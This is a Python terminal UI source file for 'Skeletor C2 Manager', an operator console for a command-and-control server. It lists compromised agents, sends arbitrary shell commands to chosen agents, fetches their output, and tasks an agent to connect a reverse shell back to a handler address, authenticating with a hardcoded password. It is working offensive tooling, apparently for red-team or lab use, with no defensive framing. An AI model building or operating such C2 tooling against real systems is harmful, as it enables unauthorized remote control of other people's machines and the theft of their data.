#!/usr/bin/env python3

from textual.app import App, ComposeResult
from textual import work
from textual.containers import Container
from textual.widgets import Header, Footer, Static, OptionList, DataTable, Button, Input, Label, SelectionList
from textual.widgets.option_list import Option
from textual.widgets.selection_list import Selection
import os
import requests

# Use environment variables with fallback
SKELETOR_IP = os.getenv("SKELETOR_IP", "127.0.0.1")
SKELETOR_PORT = os.getenv("SKELETOR_PORT", "80")
SKELETOR_WEBSHELL_HANDLER_ADDR = os.getenv("SKELETOR_WEBSHELL_HANDLER_ADDR","127.0.0.1:9000")
CUSTOM_HEADERS = {}
SKELETOR_PASSWD = "letredin"
if SKELETOR_PASSWD is not None:
    CUSTOM_HEADERS["X-Skeletor-Auth"] = SKELETOR_PASSWD

class Manager(App):

    CSS = """
    .hidden {
        display: none;
    }
    
    #menu-container {
        align: center middle;
        padding: 2;
    }
    
    #agent-display, #command-container, #results-container {
        padding: 1;
    }
    
    #title {
        text-align: center;
        text-style: bold;
        padding: 1;
        color: $accent;
    }
    
    .screen-title {
        text-align: center;
        text-style: bold;
        padding: 1;
    }
    
    DataTable {
        height: auto;
    }
    
    .back-button {
        dock: bottom;
        width: 100%;
        margin-top: 1;
    }

    #agent-selector {
        height: 15;
        margin-bottom: 1;
    }

    #command-input {
        margin-bottom: 1;
    }

    #submit-command {
        width: 100%;
        margin-bottom: 1;
    }

    #status-message {
        text-align: center;
        padding: 1;
        color: $warning;
    }

    #result-display {
        border: solid $primary;
        padding: 1;
        margin: 1;
        height: auto;
        min-height: 10;
    }

    #agent-display, #command-container, #results-container, #shell-container {
        padding: 1;
    }
    """

    BINDINGS = [
        ("r", "refresh_agents", "Refresh"),
        ("b", "show_menu", "Back to Menu"),
        ("q", "quit", "Quit"),
    ]

    def compose(self) -> ComposeResult:
        yield Header()
        
        # Main Menu
        with Container(id="menu-container"):
            yield Static("Skeletor C2 Manager", id="title")
            yield OptionList(
                Option("Get Agent Status", id="status"),
                Option("Issue A Command", id="cmd"),
                Option("Launch Shell", id="shell"),
                Option("Get Results", id="results"),
                Option("Exit", id="exit"),
            )
            yield Static("", id="status-text")

        # Agent Status View
        with Container(id="agent-display", classes="hidden"):
            yield Static("Agent Status", classes="screen-title")
            yield DataTable()
            yield Static("", id="status-message")
            yield Button("Back to Menu", classes="back-button")

        # Command Interface
        with Container(id="command-container", classes="hidden"):
            yield Static("Issue Command", classes="screen-title")
            yield Static("Select Target Agent(s) (Space to toggle):")
            yield SelectionList(id="agent-selector")
            yield Label("Command:")
            yield Input(placeholder="Enter command (e.g., whoami, ls -la)...", id="command-input")
            yield Button("Submit Command", id="submit-command", variant="primary")
            yield Static("", id="status-message")
            yield Button("Back to Menu", classes="back-button")

        with Container(id="shell-container", classes="hidden"):
            yield Static("Launch Interactive Shell", classes="screen-title")
            yield Static("Select Agent to connect back to your handler:")
            yield OptionList(id="shell-agent-selector")
            yield Label("Handler Address (IP:Port):")
            yield Input(value=SKELETOR_WEBSHELL_HANDLER_ADDR, id="shell-handler-input")
            yield Button("Launch Shell", id="launch-shell-button", variant="primary")
            yield Static("", id="status-message")
            yield Button("Back to Menu", classes="back-button")

        # Results View
        with Container(id="results-container", classes="hidden"):
            yield Static("Agent Results", classes="screen-title")
            yield Static("Select Agent:")
            yield OptionList(id="results-agent-selector")
            yield Button("Get Results", id="get-results-button", variant="primary")
            yield Static("", id="result-display")
            yield Static("", id="status-message")
            yield Button("Back to Menu", classes="back-button")
        
        yield Footer()
    
    def show_agent_status(self) -> None:
        """Switch to agent display and start fetching."""
        self._hide_all_containers()
        self.query_one("#agent-display").remove_class("hidden")
        
        table = self.query_one(DataTable)
        if not table.columns:
            table.add_column("Agent ID", width=20)
            table.add_column("Status", width=12)
            table.add_column("Tags", width=30)
            table.add_column("Last Seen", width=20)
            table.add_column("Callbacks", width=12)
        
        table.clear()
        table.add_row("Loading...", "Please wait", "", "", "")
        self._update_status_message("Fetching agents...", "#agent-display")
        
        self.fetch_agents(update_table=True)
    
    @work(exclusive=True, thread=True)
    def fetch_agents(self, update_table=False, update_selector=False, update_results_selector=False,update_shell_selector=False):
        """Fetch agents in background and update appropriate view."""
        try:
            response = requests.get(
                f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents", 
                timeout=5, headers=CUSTOM_HEADERS
            )
            response.raise_for_status()
            agents = response.json()
            
            if update_table:
                self.call_from_thread(self._update_agent_table, agents, None)
            if update_selector:
                self.call_from_thread(self._update_agent_selector, agents, None)
            if update_results_selector:
                self.call_from_thread(self._update_results_selector, agents, None)
            if update_shell_selector:
                self.call_from_thread(self._update_shell_selector, agents, None)
                
        except requests.exceptions.ConnectionError:
            error = "Connection failed - is the server running?"
            if update_table:
                self.call_from_thread(self._update_agent_table, None, error)
            if update_selector:
                self.call_from_thread(self._update_agent_selector, None, error)
            if update_results_selector:
                self.call_from_thread(self._update_results_selector, None, error)
        except requests.exceptions.Timeout:
            error = "Request timed out"
            if update_table:
                self.call_from_thread(self._update_agent_table, None, error)
            if update_selector:
                self.call_from_thread(self._update_agent_selector, None, error)
            if update_results_selector:
                self.call_from_thread(self._update_results_selector, None, error)
        except Exception as e:
            error = f"Error: {str(e)}"
            if update_table:
                self.call_from_thread(self._update_agent_table, None, error)
            if update_selector:
                self.call_from_thread(self._update_agent_selector, None, error)
            if update_results_selector:
                self.call_from_thread(self._update_results_selector, None, error)

    def _update_shell_selector(self, agents, error):
        selector = self.query_one("#shell-agent-selector", OptionList)
        selector.clear_options()
        if agents:
            for agent in agents:
                selector.add_option(Option(f"{agent.get('agent_id')} ({agent.get('status')})", id=agent.get('agent_id')))
    
    def _update_agent_table(self, agents, error):
        """Update the agent table with fetched data."""
        table = self.query_one(DataTable)
        table.clear()
        
        if error:
            table.add_row("Error", error, "", "", "")
            self._update_status_message(error, "#agent-display")
        elif agents:
            for agent in agents:
                tags_str = ",".join(agent.get("tags", [])) if agent.get("tags") else ""
                table.add_row(
                    agent.get("agent_id", "N/A"),
                    agent.get("status", "N/A"),
                    tags_str,
                    agent.get("last_seen", "N/A"),
                    str(agent.get("callbacks", "N/A"))
                )
            self._update_status_message(f"Loaded {len(agents)} agent(s)", "#agent-display")
        else:
            table.add_row("No agents", "", "", "", "")
            self._update_status_message("No agents available", "#agent-display")
    
    def _update_agent_selector(self, agents, error):
        """Update the command agent selector with fetched data."""
        agent_selector = self.query_one("#agent-selector", SelectionList)
        agent_selector.clear_options()
        
        if error:
            self._update_status_message(error, "#command-container")
        elif agents:
            for agent in agents:
                tags_str = ",".join(agent.get("tags", [])) if agent.get("tags") else "None"
                agent_id = agent.get("agent_id", "unknown")
                status = agent.get("status", "unknown")
                display = f"{agent_id} ({status})\t\tTags: {tags_str}"
                agent_selector.add_option(Selection(display, agent_id))
            self._update_status_message(
                f"Loaded {len(agents)} agent(s) - Select targets and enter command", 
                "#command-container"
            )
        else:
            self._update_status_message("No agents available", "#command-container")

    def _update_results_selector(self, agents, error):
        """Update the results agent selector with fetched data."""
        results_selector = self.query_one("#results-agent-selector", OptionList)
        results_selector.clear_options()
        
        if error:
            results_selector.add_option(Option(f"Error: {error}", id="error", disabled=True))
            self._update_status_message(error, "#results-container")
        elif agents:
            for agent in agents:
                agent_id = agent.get("agent_id", "unknown")
                status = agent.get("status", "unknown")
                display = f"{agent_id} ({status})"
                results_selector.add_option(Option(display, id=agent_id))
            self._update_status_message(f"Select an agent to view results", "#results-container")
        else:
            results_selector.add_option(Option("No agents available", id="none", disabled=True))
            self._update_status_message("No agents available", "#results-container")
    
    def _update_status_message(self, message: str, container_id: str):
        """Update status message in a specific container."""
        try:
            container = self.query_one(container_id)
            status_msg = container.query_one("#status-message", Static)
            status_msg.update(message)
        except:
            pass
    
    def _hide_all_containers(self):
        """Hide all main containers."""
        self.query_one("#menu-container").add_class("hidden")
        self.query_one("#agent-display").add_class("hidden")
        self.query_one("#command-container").add_class("hidden")
        self.query_one("#results-container").add_class("hidden")
        self.query_one("#shell-container").add_class("hidden")

    def on_option_list_option_selected(self, event: OptionList.OptionSelected):
        """Handle menu selection (only for main menu)"""
        # Only handle main menu selections
        if event.option_list.parent.id == "menu-container":
            if event.option.id == "exit":
                self.exit()
            elif event.option.id == "status":
                self.show_agent_status()
            elif event.option.id == "cmd":
                self.show_command_interface()
            elif event.option.id == "results":
                self.show_results_interface()
            elif event.option.id == "shell":
                self.show_shell_interface()

    def on_button_pressed(self, event: Button.Pressed):
        """Handle button clicks."""
        if "back-button" in event.button.classes:
            self.show_menu()
        elif event.button.id == "submit-command":
            self.submit_command()
        elif event.button.id == "get-results-button":
            self.get_agent_results()
        elif event.button.id == "launch-shell-button":
            self.launch_shell()
    
    def show_menu(self):
        """Return to the main menu."""
        self._hide_all_containers()
        self.query_one("#menu-container").remove_class("hidden")
        try:
            self.query_one("#command-input", Input).value = ""
        except:
            pass
        self.query_one("#menu-container").query_one(OptionList).focus()

    def show_command_interface(self):
        """Switch to command interface and fetch agents."""
        self._hide_all_containers()
        self.query_one("#command-container").remove_class("hidden")
        
        self._update_status_message("Loading agents...", "#command-container")
        
        self.fetch_agents(update_selector=True)

    def show_results_interface(self):
        """Switch to results interface and fetch agents."""
        self._hide_all_containers()
        self.query_one("#results-container").remove_class("hidden")
        
        results_selector = self.query_one("#results-agent-selector", OptionList)
        results_selector.clear_options()
        results_selector.add_option(Option("Loading agents...", id="loading", disabled=True))
        self._update_status_message("Loading agents...", "#results-container")
        
        # Clear previous results
        self.query_one("#result-display", Static).update("")
        
        self.fetch_agents(update_results_selector=True)

    def submit_command(self):
        """Submit command to selected agents - matches skelctl workflow."""
        agent_selector = self.query_one("#agent-selector", SelectionList)
        command_input = self.query_one("#command-input", Input)
        
        # Get selected agents from SelectionList
        selected_agents = list(agent_selector.selected)
        
        command = command_input.value.strip()
        
        # Validation
        if not command:
            self._update_status_message("Error: Please enter a command", "#command-container")
            return
        
        if not selected_agents:
            self._update_status_message("Error: Please select at least one agent (use Space to toggle)", "#command-container")
            return
        
        # Issue command using skelctl workflow
        self._update_status_message(f"Issuing command to {len(selected_agents)} agent(s)...", "#command-container")
        self.issue_command_to_agents(selected_agents, command)
    
    @work(exclusive=True, thread=True)
    def issue_command_to_agents(self, agent_ids: list, command: str):
        try:
            targets_payload = {"ips": agent_ids}
            response = requests.post(
                f"http://{SKELETOR_IP}:{SKELETOR_PORT}/set-targets",
                json=targets_payload,
                timeout=5,headers=CUSTOM_HEADERS
            )
            response.raise_for_status()
            tasks_created = 0
            for agent_id in agent_ids:
                task_data = {
                    'agent_id': agent_id,
                    'action': 'command',
                    'input': command
                }
                response = requests.post(
                    f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task",
                    json=task_data,
                    timeout=5,headers=CUSTOM_HEADERS
                )
                response.raise_for_status()
                tasks_created += 1
            
            success_msg = f"✓ Command issued successfully! Tasks created: {tasks_created}/{len(agent_ids)}"
            self.call_from_thread(self._update_status_message, success_msg, "#command-container")
            self.call_from_thread(self._clear_command_input)
            
        except requests.exceptions.ConnectionError:
            error_msg = "✗ Connection failed - is the server running?"
            self.call_from_thread(self._update_status_message, error_msg, "#command-container")
        except requests.exceptions.Timeout:
            error_msg = "✗ Request timed out"
            self.call_from_thread(self._update_status_message, error_msg, "#command-container")
        except Exception as e:
            error_msg = f"✗ Error: {str(e)}"
            self.call_from_thread(self._update_status_message, error_msg, "#command-container")
    
    def get_agent_results(self):
        """Get results from selected agent."""
        results_selector = self.query_one("#results-agent-selector", OptionList)
        
        # OptionList.highlighted is an int (index) or None
        if results_selector.highlighted is not None:
            try:
                option = results_selector.get_option_at_index(results_selector.highlighted)
                if option.id not in ["error", "none", "loading"]:
                    selected_agent = option.id
                    self._update_status_message(f"Fetching results for {selected_agent}...", "#results-container")
                    self.fetch_agent_results(selected_agent)
                    return
            except Exception as e:
                self._update_status_message(f"Error getting selection: {str(e)}", "#results-container")
                return
        
        self._update_status_message("Error: Please select an agent", "#results-container")
    
    @work(exclusive=True, thread=True)
    def fetch_agent_results(self, agent_id: str):
        try:
            data = {"agent_id": agent_id}
            response = requests.post(
                f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result",
                json=data,
                timeout=5,headers=CUSTOM_HEADERS
            )
            response.raise_for_status()
            result = response.json()
            
            # Format output similar to skelctl
            result_text = f"""Agent: {agent_id}
Command: {result.get('command', 'N/A')}
Result:
{result.get('result', 'No result available')}
"""
            
            self.call_from_thread(self._update_result_display, result_text)
            self.call_from_thread(self._update_status_message, "✓ Results retrieved", "#results-container")
            
        except requests.exceptions.ConnectionError:
            error_msg = "✗ Connection failed - is the server running?"
            self.call_from_thread(self._update_status_message, error_msg, "#results-container")
        except requests.exceptions.Timeout:
            error_msg = "✗ Request timed out"
            self.call_from_thread(self._update_status_message, error_msg, "#results-container")
        except Exception as e:
            error_msg = f"✗ Error: {str(e)}"
            self.call_from_thread(self._update_status_message, error_msg, "#results-container")
    
    def _update_result_display(self, text: str):
        """Update the result display area."""
        self.query_one("#result-display", Static).update(text)
    
    def _clear_command_input(self):
        """Clear the command input field."""
        try:
            self.query_one("#command-input", Input).value = ""
        except:
            pass

    def action_refresh_agents(self):
        """Refresh agent list when 'r' is pressed."""
        if not self.query_one("#agent-display").has_class("hidden"):
            self.fetch_agents(update_table=True)
        elif not self.query_one("#command-container").has_class("hidden"):
            self.fetch_agents(update_selector=True)
        elif not self.query_one("#results-container").has_class("hidden"):
            self.fetch_agents(update_results_selector=True)

    def action_show_menu(self):
        """Return to the main menu when 'b' is pressed."""
        self.show_menu()
    
    def show_shell_interface(self):
        """Switch to shell interface and fetch agents."""
        self._hide_all_containers()
        self.query_one("#shell-container").remove_class("hidden")
        self._update_status_message("Loading agents...", "#shell-container")
        self.fetch_agents(update_shell_selector=True)

    def launch_shell(self):
            """Trigger the interactive shell task."""
            selector = self.query_one("#shell-agent-selector", OptionList)
            handler_input = self.query_one("#shell-handler-input", Input)
            
            if selector.highlighted is not None:
                option = selector.get_option_at_index(selector.highlighted)
                if option.id not in ["error", "none", "loading"]:
                    agent_id = option.id
                    handler_addr = handler_input.value.strip()
                    self._update_status_message(f"Tasking {agent_id} to connect to {handler_addr}...", "#shell-container")
                    self.issue_shell_task(agent_id, handler_addr)
                    return

            self._update_status_message("Error: Please select an agent", "#shell-container")

    @work(exclusive=True, thread=True)
    def issue_shell_task(self, agent_id: str, handler_addr: str):
        try:
            task_data = {
                'agent_id': agent_id,
                'action': 'shell',
                'input': handler_addr
            }
            response = requests.post(
                f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task",
                json=task_data, timeout=5, headers=CUSTOM_HEADERS
            )
            response.raise_for_status()
            self.call_from_thread(self._update_status_message, f"✓ Shell task sent to {agent_id}!", "#shell-container")
        except Exception as e:
            self.call_from_thread(self._update_status_message, f"✗ Error: {str(e)}", "#shell-container")


if __name__ == "__main__":
    app = Manager()
    app.run()